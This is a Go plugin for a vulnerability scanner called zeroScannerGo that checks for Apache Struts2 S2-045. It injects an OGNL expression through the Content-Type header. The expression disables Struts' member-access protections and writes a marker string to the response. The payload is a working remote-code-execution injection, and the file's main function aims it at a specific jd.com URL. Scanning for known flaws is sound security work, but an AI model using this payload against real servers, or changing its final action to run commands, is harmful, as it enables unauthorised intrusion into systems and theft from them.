/*
all
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	paths   = []string{"/HelloWorld.action", "/index.action", "/index.do", "/index.aspx", "/index.json", "/index.html"}
	payload = "%{(#jsec='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(new byte[]{106,100,115,101,99,117,114,105,116,121})).(#ros.flush()).(#ros.close())}"
)

func Verify(params engine.Params) (result engine.Result) {
	newpath := util.GetPaths(paths, params.ParsedTarget.Path)
	for _, path := range newpath {
		params.ParsedTarget.Path = path
		resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
			DialTimeout:        time.Second * 5,
			RequestTimeout:     time.Second * 5,
			Hosts:              params.Hosts,
			RawCookie:          params.Cookie,
			ContentType:        payload,
			InsecureSkipVerify: true,
			DisableRedirect:    true,
		})
		if err != nil {
			result.Stop = 24
			return
		}
		body := resp.String()
		resp.Close()
		if strings.Contains(body, "jdsecurity") {
			result.Vul = true
			result.RawReq = resp.RawRequest()
			result.VulUrl = params.ParsedTarget.String()
			result.VulInfo = "struts2045"
			result.Extend = body
			return
		}
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://traintck.jd.com/tuniu/callback_20005.html"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget
	params.Cookie = "pin=test;thor=testthor"
	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
